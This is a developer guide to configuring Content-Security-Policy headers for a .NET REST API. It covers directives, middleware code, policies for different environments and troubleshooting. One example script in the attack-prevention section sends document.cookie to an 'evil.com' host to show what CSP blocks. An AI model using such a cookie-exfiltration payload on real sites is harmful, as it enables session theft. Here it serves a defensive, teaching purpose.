# Content-Security-Policy (CSP) Guide for .NET APIs

This guide explains Content-Security-Policy (CSP) in the context of .NET REST APIs, Microsoft's recommendations, industry standards, and best practices for implementation.

[← Back to README](../../README.md)

## Table of Contents

- [Overview](#overview)
- [What is Content-Security-Policy?](#what-is-content-security-policy)
- [CSP for APIs vs Web Pages](#csp-for-apis-vs-web-pages)
- [Microsoft Guidelines](#microsoft-guidelines)
- [Industry Standards](#industry-standards)
- [CSP Directives for APIs](#csp-directives-for-apis)
- [Implementation in .NET Core](#implementation-in-net-core)
- [Configuration Options](#configuration-options)
- [Best Practices](#best-practices)
- [Common Scenarios](#common-scenarios)
- [Troubleshooting](#troubleshooting)
- [Related Security Headers](#related-security-headers)

## Overview

Content-Security-Policy (CSP) is a security mechanism that helps prevent Cross-Site Scripting (XSS) attacks, data injection attacks, and other code injection vulnerabilities by controlling which resources a browser is allowed to load and execute.

**Why CSP exists:**

- Prevents XSS attacks by blocking unauthorized script execution
- Controls resource loading (scripts, styles, images, fonts, etc.)
- Prevents clickjacking via `frame-ancestors` directive
- Provides defense-in-depth security layer
- Helps meet compliance requirements (OWASP, PCI-DSS, etc.)

**For .NET APIs:**

- APIs typically return JSON, not HTML, so CSP is less critical than for web pages
- Still recommended as defense-in-depth for any HTML endpoints (error pages, documentation, admin UI)
- Protects against XSS in API responses consumed by frontend applications
- Modern browsers enforce CSP on all HTTP responses, including API responses

**Implementation Location:**

- Middleware: `src/WebShop.Api/Extensions/Middleware/MiddlewareExtensions.cs`
- Configuration: `appsettings.json` (optional, can be hardcoded for APIs)
- Response headers: Automatically added to all HTTP responses

## What is Content-Security-Policy?

CSP is an HTTP response header that tells browsers which sources of content are allowed to be loaded and executed. It uses a policy string with directives that specify allowed sources for different types of resources.

### Basic Syntax

```
Content-Security-Policy: <directive> <source> [<source> ...]; <directive> <source> ...
```

### Example Policy

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'
```

This policy:

- `default-src 'self'` - Only allow resources from the same origin
- `script-src 'self' 'unsafe-inline'` - Allow scripts from same origin and inline scripts
- `style-src 'self' 'unsafe-inline'` - Allow styles from same origin and inline styles

### How It Works

1. **Browser receives response** with CSP header
2. **Browser parses policy** and creates allowlist
3. **Browser blocks resources** that don't match the policy
4. **Browser reports violations** (if `report-uri` is configured)

### Example Attack Prevention

**Without CSP:**

```html
<!-- Malicious script injected into API response -->
<script>
  fetch('https://evil.com/steal', {method: 'POST', body: document.cookie});
</script>
```

Browser executes the script → Data stolen

**With CSP:**

```
Content-Security-Policy: script-src 'self'
```

Browser blocks the script → Attack prevented

## CSP for APIs vs Web Pages

### Key Differences

| Aspect | Web Pages | REST APIs |
|--------|-----------|-----------|
| **Primary Content** | HTML with embedded resources | JSON data |
| **XSS Risk** | High (HTML rendered in browser) | Low (JSON parsed by application) |
| **CSP Importance** | Critical | Moderate (defense-in-depth) |
| **Common Directives** | `script-src`, `style-src`, `img-src` | `frame-ancestors`, `default-src` |
| **Inline Scripts** | Common (needs `'unsafe-inline'`) | Rare (not applicable) |
| **External Resources** | Common (CDNs, fonts, images) | Rare (API doesn't load resources) |

### When CSP Matters for APIs

1. **HTML Error Pages**
   - Custom error pages rendered as HTML
   - Swagger/OpenAPI documentation (Scalar UI, Swagger UI)
   - Admin interfaces or dashboards

2. **API Responses Consumed by Frontend**
   - If API returns HTML fragments
   - If API responses are inserted into DOM without sanitization
   - If API is used in `<iframe>` contexts

3. **Clickjacking Protection**
   - `frame-ancestors` directive prevents iframe embedding
   - Protects against clickjacking attacks
   - Important even for JSON APIs

4. **Compliance Requirements**
   - OWASP Top 10 recommendations
   - PCI-DSS requirements
   - Security audit requirements

## Microsoft Guidelines

### Microsoft's Official Recommendations

According to Microsoft's security documentation and best practices:

#### 1. **Always Use CSP in Production**

✅ **Recommended:**

- Implement CSP for all web applications and APIs
- Use restrictive policies by default
- Test policies in report-only mode first

❌ **Not Recommended:**

- Skipping CSP entirely
- Using overly permissive policies (`'unsafe-inline'`, `'unsafe-eval'`)
- Not testing policies before enforcement

#### 2. **Use Report-Only Mode for Testing**

Microsoft recommends using `Content-Security-Policy-Report-Only` header to test policies without blocking content:

```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /api/csp-report
```

**Benefits:**

- Monitor violations without breaking functionality
- Fine-tune policies based on real usage
- Identify false positives before enforcement

#### 3. **Prefer Nonces Over 'unsafe-inline'**

✅ **Good:**

```csharp
// Generate nonce per request
var nonce = Convert.ToBase64String(RandomNumberGenerator.GetBytes(16));
context.Response.Headers["Content-Security-Policy"] = 
    $"script-src 'self' 'nonce-{nonce}'; style-src 'self' 'nonce-{nonce}'";
```

❌ **Avoid:**

```csharp
// Overly permissive
context.Response.Headers["Content-Security-Policy"] = 
    "script-src 'self' 'unsafe-inline' 'unsafe-eval'";
```

#### 4. **Use frame-ancestors for Clickjacking Protection**

Microsoft recommends using CSP's `frame-ancestors` directive for clickjacking protection:

```
Content-Security-Policy: frame-ancestors 'none'
```

**Rationale:**

- Modern replacement for the deprecated `X-Frame-Options` header
- More flexible (can specify multiple origins)
- Better browser support in modern browsers
- Single mechanism for clickjacking protection (no need for legacy headers)

#### 5. **Environment-Specific Policies**

✅ **Recommended:**

- Development: More permissive (for debugging)
- Production: Restrictive (maximum security)

#### 6. **Microsoft Entra ID CSP Example**

Microsoft Entra ID (formerly Azure AD) enforces strict CSP on sign-in pages:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{nonce}'; 
  style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; 
  font-src 'self' data:; connect-src 'self' https://login.microsoftonline.com
```

**Key Points:**

- Uses nonces for inline scripts
- Allows specific external domains only
- Restricts resource loading to trusted sources

## Industry Standards

### OWASP Recommendations

**OWASP Top 10 (2021)** includes injection attacks (including XSS) as a critical risk. CSP is recommended as a primary defense mechanism.

**OWASP CSP Cheat Sheet:**

1. **Start with restrictive policy** - `default-src 'self'`
2. **Add exceptions carefully** - Only allow what's necessary
3. **Use nonces or hashes** - Avoid `'unsafe-inline'`
4. **Test thoroughly** - Use report-only mode first
5. **Monitor violations** - Set up reporting endpoint

### W3C CSP Specification

The W3C Content Security Policy Level 3 specification defines:

- Standard directives and sources
- Browser enforcement behavior
- Reporting mechanism
- Nonce and hash support

### Compliance Standards

**PCI-DSS Requirement 6.5.7:**

- Protect against XSS attacks
- CSP is an accepted control

**NIST Cybersecurity Framework:**

- CSP helps meet "Protect" function requirements
- Defense-in-depth security control

## CSP Directives for APIs

### Most Relevant Directives for REST APIs

#### 1. `frame-ancestors` ⭐ **Most Important for APIs**

**Purpose:** Controls which origins can embed the response in frames (iframes, frames, objects, embeds).

**Values:**

- `'none'` - No embedding allowed (most restrictive)
- `'self'` - Only same origin can embed
- `https://example.com` - Specific origin can embed
- `*` - Any origin can embed (not recommended)

**Example:**

```
Content-Security-Policy: frame-ancestors 'none'
```

**Use Case:** Prevents clickjacking attacks. Critical for APIs even if they return JSON.

**Microsoft Recommendation:** Use `frame-ancestors 'none'` for APIs that shouldn't be embedded.

#### 2. `default-src` ⭐ **Important for APIs**

**Purpose:** Fallback for other directives. If a directive isn't specified, `default-src` applies.

**Values:**

- `'self'` - Only same origin
- `'none'` - Block everything
- `https://example.com` - Specific origin
- `*` - Allow all (not recommended)

**Example:**

```
Content-Security-Policy: default-src 'self'; frame-ancestors 'none'
```

**Use Case:** Sets baseline security for all resource types.

**Microsoft Recommendation:** Use `default-src 'self'` as baseline, then add specific directives.

#### 3. `script-src` (Less Relevant for APIs)

**Purpose:** Controls which scripts can be executed.

**Relevance:** Low for JSON APIs, but important if API serves HTML (error pages, documentation).

**Example:**

```
Content-Security-Policy: script-src 'self' 'nonce-{nonce}'
```

**Use Case:** If API serves Swagger UI, Scalar UI, or custom error pages with JavaScript.

#### 4. `style-src` (Less Relevant for APIs)

**Purpose:** Controls which stylesheets can be loaded.

**Relevance:** Low for JSON APIs, but important for HTML endpoints.

**Example:**

```
Content-Security-Policy: style-src 'self' 'unsafe-inline'
```

**Use Case:** If API serves HTML pages with inline styles.

#### 5. `connect-src` (Relevant for APIs)

**Purpose:** Controls which URLs can be loaded via fetch, XMLHttpRequest, WebSocket, etc.

**Relevance:** Medium - affects frontend applications consuming the API.

**Example:**

```
Content-Security-Policy: connect-src 'self' https://api.example.com
```

**Use Case:** If frontend applications need to make requests to the API, this controls where those requests can go.

**Note:** This affects the **frontend application**, not the API itself. The API sets this header, but the browser enforces it on the frontend.

#### 6. `base-uri` (Less Relevant for APIs)

**Purpose:** Controls which URLs can be used as the base URL for relative URLs.

**Relevance:** Low for APIs.

**Example:**

```
Content-Security-Policy: base-uri 'self'
```

#### 7. `form-action` (Less Relevant for APIs)

**Purpose:** Controls which URLs can be used as form action targets.

**Relevance:** Low for REST APIs (APIs don't typically serve forms).

**Example:**

```
Content-Security-Policy: form-action 'self'
```

### Less Relevant Directives for APIs

These directives are primarily for web pages, not APIs:

- `img-src` - Image sources (APIs don't serve images)
- `font-src` - Font sources (APIs don't serve fonts)
- `media-src` - Media sources (APIs don't serve media)
- `object-src` - Plugin sources (rarely used)
- `worker-src` - Web Worker sources (not applicable to APIs)
- `manifest-src` - Web App Manifest (not applicable to APIs)

## Implementation in .NET Core

CSP is implemented in the WebShop API following .NET best practices.

### Implementation Files

- **Configuration Model**: `src/WebShop.Util/Models/SecurityHeadersSettings.cs`
- **Extension Methods**: `src/WebShop.Api/Extensions/SecurityHeadersExtensions.cs`
- **Service Registration**: `src/WebShop.Api/Extensions/Core/ServiceExtensions.cs`
- **Middleware Registration**: `src/WebShop.Api/Extensions/Middleware/MiddlewareExtensions.cs`
- **Configuration**: `src/WebShop.Api/appsettings.json` → `SecurityHeaders` section

### Configuration

Add to `appsettings.json`:

```json
{
  "SecurityHeaders": {
    "Enabled": true,
    "ContentSecurityPolicy": "default-src 'self'; frame-ancestors 'none'",
    "XContentTypeOptions": "nosniff",
    "ReferrerPolicy": "strict-origin-when-cross-origin"
  }
}
```

**Note:** In non-production environments, if the configured policy doesn't include `script-src` or `style-src`, the code automatically uses a Scalar UI-compatible policy. Production always uses the configured policy.

### Middleware Ordering

Security headers are added early in the middleware pipeline:

```csharp
app.EnforceHttps();              // 1. HTTPS enforcement
app.UseSecurityHeaders();        // 2. Security headers (including CSP)
app.UseResponseCompression();    // 3. Response compression
```

**Rationale:** Security headers must be added before response compression and other middleware that might modify responses.

### Basic Implementation Example

```csharp
// In Middleware/MiddlewareExtensions.cs
public static void ConfigureMiddleware(this WebApplication app)
{
    app.EnforceHttps();
    
    // Add security headers including CSP
    app.UseSecurityHeaders();
    
    app.UseResponseCompressionIfEnabled();
    // ... rest of middleware
}

private static void UseSecurityHeaders(this WebApplication app)
{
    app.Use(async (context, next) =>
    {
        // CSP for APIs: Restrictive policy (includes clickjacking protection via frame-ancestors)
        context.Response.Headers.Append("Content-Security-Policy", 
            "default-src 'self'; frame-ancestors 'none'");
        
        // Other security headers
        context.Response.Headers.Append("X-Content-Type-Options", "nosniff");
        context.Response.Headers.Append("Referrer-Policy", "strict-origin-when-cross-origin");
        
        await next();
    });
}
```

### Configuration-Based Implementation

Create a configuration model for flexibility:

```csharp
// In WebShop.Util/Models/SecurityHeadersSettings.cs
namespace WebShop.Util.Models;

/// <summary>
/// Configuration options for security headers.
/// </summary>
public class SecurityHeadersSettings
{
    /// <summary>
    /// Content-Security-Policy header value.
    /// Includes frame-ancestors directive for clickjacking protection.
    /// </summary>
    public string ContentSecurityPolicy { get; set; } = "default-src 'self'; frame-ancestors 'none'";

    /// <summary>
    /// X-Content-Type-Options value.
    /// </summary>
    public string XContentTypeOptions { get; set; } = "nosniff";

    /// <summary>
    /// Referrer-Policy value.
    /// </summary>
    public string ReferrerPolicy { get; set; } = "strict-origin-when-cross-origin";
}
```

### Environment-Specific Policies

```csharp
private static void UseSecurityHeaders(this WebApplication app, IConfiguration configuration)
{
    SecurityHeadersSettings settings = new();
    configuration.GetSection("SecurityHeaders").Bind(settings);

    app.Use(async (context, next) =>
    {
        // CSP: Environment-specific
        string cspPolicy = app.Environment.IsDevelopment()
            ? "default-src 'self'; frame-ancestors 'none'; report-uri /api/csp-report"
            : settings.ContentSecurityPolicy;

        context.Response.Headers.Append("Content-Security-Policy", cspPolicy);

        // Other headers
        context.Response.Headers.Append("X-Content-Type-Options", settings.XContentTypeOptions);
        context.Response.Headers.Append("Referrer-Policy", settings.ReferrerPolicy);

        await next();
    });
}
```

### Configuration File

```json
{
  "SecurityHeaders": {
    "Enabled": true,
    "ContentSecurityPolicy": "default-src 'self'; frame-ancestors 'none'",
    "XContentTypeOptions": "nosniff",
    "ReferrerPolicy": "strict-origin-when-cross-origin"
  }
}
```

### Advanced: Nonce Support (for HTML Endpoints)

If your API serves HTML (error pages, documentation), use nonces:

```csharp
private static void UseSecurityHeaders(this WebApplication app)
{
    app.Use(async (context, next) =>
    {
        // Generate nonce for this request
        var nonce = Convert.ToBase64String(RandomNumberGenerator.GetBytes(16));
        
        // Store nonce for use in HTML rendering
        context.Items["CSP-Nonce"] = nonce;

        // CSP with nonce
        string cspPolicy = $"default-src 'self'; " +
                          $"script-src 'self' 'nonce-{nonce}'; " +
                          $"style-src 'self' 'unsafe-inline'; " +
                          $"frame-ancestors 'none'";

        context.Response.Headers.Append("Content-Security-Policy", cspPolicy);
        
        await next();
    });
}

// In HTML rendering (e.g., error page)
var nonce = context.Items["CSP-Nonce"] as string;
<script nonce="@nonce">
    // This script will be allowed
</script>
```

## Configuration Options

- **`Enabled`** (boolean, default: `true`): Set to `false` to disable security headers

### Recommended Policies for APIs

#### 1. **Minimal Policy (JSON APIs Only)**

```
Content-Security-Policy: default-src 'self'; frame-ancestors 'none'
```

**Use Case:** Pure REST API returning only JSON.

**Benefits:**

- Maximum security
- Simple to maintain
- No false positives

#### 2. **Policy with Documentation (Swagger/Scalar UI)**

```
Content-Security-Policy: default-src 'self'; 
  script-src 'self' 'unsafe-inline' 'unsafe-eval'; 
  style-src 'self' 'unsafe-inline'; 
  img-src 'self' data: https:; 
  font-src 'self' data:; 
  frame-ancestors 'none'
```

**Use Case:** API with Swagger UI or Scalar UI documentation.

**Note:** In non-production environments, this policy is automatically applied for Scalar UI compatibility. Production uses the configured restrictive policy. `'unsafe-inline'` and `'unsafe-eval'` are needed for Scalar UI but reduce security.

#### 3. **Policy with Custom Error Pages**

```
Content-Security-Policy: default-src 'self'; 
  script-src 'self' 'nonce-{nonce}'; 
  style-src 'self' 'unsafe-inline'; 
  frame-ancestors 'none'
```

**Use Case:** API with custom HTML error pages.

**Benefits:**

- Uses nonces for inline scripts (more secure)
- Allows inline styles (often needed for error pages)

#### 4. **Report-Only Mode (Testing)**

```
Content-Security-Policy-Report-Only: default-src 'self'; frame-ancestors 'none'; report-uri /api/csp-report
```

**Use Case:** Testing policies before enforcement.

**Benefits:**

- Monitors violations without blocking
- Helps fine-tune policies

### Policy Sources

| Source | Description | Security Level |
|--------|-------------|----------------|
| `'self'` | Same origin only | ✅ High |
| `'none'` | Block everything | ✅ Highest |
| `https://example.com` | Specific origin | ✅ High |
| `https://*.example.com` | Subdomain wildcard | ⚠️ Medium |
| `'unsafe-inline'` | Allow inline scripts/styles | ❌ Low |
| `'unsafe-eval'` | Allow eval(), Function(), etc. | ❌ Very Low |
| `*` | Allow all origins | ❌ Very Low |
| `data:` | Allow data: URLs | ⚠️ Medium |
| `'nonce-{value}'` | Allow scripts with matching nonce | ✅ High |
| `'sha256-{hash}'` | Allow scripts with matching hash | ✅ High |

## Best Practices

### 1. **Start Restrictive, Add Exceptions Carefully**

✅ **Good:**

```
Content-Security-Policy: default-src 'self'; frame-ancestors 'none'
```

❌ **Bad:**

```
Content-Security-Policy: default-src *
```

### 2. **Use frame-ancestors for Clickjacking Protection**

✅ **Good:**

```
Content-Security-Policy: frame-ancestors 'none'
```

**Rationale:** Prevents clickjacking attacks. Critical even for JSON APIs.

### 3. **Avoid 'unsafe-inline' and 'unsafe-eval' When Possible**

❌ **Avoid:**

```
Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval'
```

✅ **Prefer:**

```
Content-Security-Policy: script-src 'self' 'nonce-{nonce}'
```

**Rationale:** `'unsafe-inline'` and `'unsafe-eval'` significantly reduce security.

### 4. **Test in Report-Only Mode First**

✅ **Good:**

```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /api/csp-report
```

**Rationale:** Identify violations before enforcement.

### 5. **Use CSP frame-ancestors for Clickjacking Protection**

✅ **Good:**

```
Content-Security-Policy: frame-ancestors 'none'
```

**Rationale:** CSP `frame-ancestors` is the modern replacement for the deprecated `X-Frame-Options` header. Use CSP for clickjacking protection.

### 6. **Environment-Specific Policies**

✅ **Good:**

- Development: More permissive (for debugging)
- Production: Restrictive (maximum security)

### 7. **Monitor and Review Violations**

✅ **Good:**

- Set up CSP reporting endpoint
- Monitor violation reports
- Review and update policies regularly

### 8. **Document Your Policy**

✅ **Good:**

- Document why each directive is needed
- Explain any exceptions
- Keep policy documentation up to date

## Common Scenarios

### Scenario 1: Pure REST API (JSON Only)

**Policy:**

```
Content-Security-Policy: default-src 'self'; frame-ancestors 'none'
```

**Rationale:**

- API returns JSON, no HTML rendering
- `frame-ancestors 'none'` prevents clickjacking
- `default-src 'self'` sets baseline security

### Scenario 2: API with Swagger UI

**Policy:**

```
Content-Security-Policy: default-src 'self'; 
  script-src 'self' 'unsafe-inline' 'unsafe-eval'; 
  style-src 'self' 'unsafe-inline'; 
  img-src 'self' data:; 
  font-src 'self' data:; 
  frame-ancestors 'none'
```

**Rationale:**

- Swagger UI requires `'unsafe-inline'` and `'unsafe-eval'`
- Images and fonts from data: URLs
- Still prevents clickjacking

**Note:** Consider using Scalar UI instead, which may have better CSP support.

### Scenario 3: API with Custom HTML Error Pages

**Policy:**

```
Content-Security-Policy: default-src 'self'; 
  script-src 'self' 'nonce-{nonce}'; 
  style-src 'self' 'unsafe-inline'; 
  frame-ancestors 'none'
```

**Rationale:**

- Uses nonces for inline scripts (more secure)
- Allows inline styles (often needed)
- Prevents clickjacking

### Scenario 4: API Behind CDN/Proxy

**Policy:**

```
Content-Security-Policy: default-src 'self' https://cdn.example.com; frame-ancestors 'none'
```

**Rationale:**

- Allows resources from CDN
- Still restricts to trusted sources
- Prevents clickjacking

## Troubleshooting

### Issue: CSP Blocking Legitimate Resources

**Symptom:** Browser console shows CSP violation errors.

**Solutions:**

1. Check violation reports (if `report-uri` is configured)
2. Review CSP policy - may be too restrictive
3. Add necessary sources to appropriate directives
4. Use report-only mode to identify issues

### Issue: Swagger UI Not Working

**Symptom:** Swagger UI doesn't load or JavaScript errors.

**Solutions:**

1. Add `'unsafe-inline'` and `'unsafe-eval'` to `script-src`
2. Add `data:` to `img-src` and `font-src`
3. Consider using Scalar UI (better CSP support)
4. Use nonces if possible (more secure)

### Issue: Custom Error Pages Not Rendering

**Symptom:** Error pages show but JavaScript doesn't work.

**Solutions:**

1. Use nonces for inline scripts
2. Add nonce to script tags: `<script nonce="{nonce}">`
3. Or use `'unsafe-inline'` (less secure)

### Issue: Frontend Can't Call API

**Symptom:** Frontend application gets CSP violations when calling API.

**Note:** This is usually a frontend CSP issue, not an API issue. The API's CSP affects HTML responses, not API calls.

**Solutions:**

1. Configure CSP on the frontend application
2. Add API URL to `connect-src` directive in frontend CSP
3. API CSP doesn't affect API calls (only HTML responses)

## Related Security Headers

CSP works best when combined with other security headers:

**Note:** CSP's `frame-ancestors` directive replaces the deprecated `X-Frame-Options` header. Use CSP for clickjacking protection.

### X-Content-Type-Options

**Purpose:** Prevents MIME type sniffing.

**Value:** `nosniff`

**Recommendation:** Always include this header.

### Referrer-Policy

**Purpose:** Controls how much referrer information is sent.

**Value:** `strict-origin-when-cross-origin` (recommended)

**Recommendation:** Include for privacy protection.

### Permissions-Policy (formerly Feature-Policy)

**Purpose:** Controls browser features and APIs.

**Example:**

```
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

**Recommendation:** Include if you want to restrict browser features.

## Summary

Content-Security-Policy for .NET APIs:

- ✅ **Recommended** as defense-in-depth security measure
- ✅ **Most important directive:** `frame-ancestors 'none'` (prevents clickjacking)
- ✅ **Minimal policy for JSON APIs:** `default-src 'self'; frame-ancestors 'none'`
- ✅ **Test in report-only mode** before enforcement
- ✅ **Use nonces** instead of `'unsafe-inline'` when possible
- ✅ **Combine with other security headers** for maximum protection
- ✅ **Environment-specific policies** (more permissive in dev, restrictive in prod)

**Key Takeaways:**

1. CSP is less critical for JSON APIs than web pages, but still recommended
2. `frame-ancestors 'none'` is the most important directive for APIs (replaces deprecated X-Frame-Options)
3. Start with restrictive policies and add exceptions carefully
4. Test policies in report-only mode before enforcement
5. Use CSP `frame-ancestors` for clickjacking protection (modern replacement for X-Frame-Options)
6. Monitor and review violation reports regularly
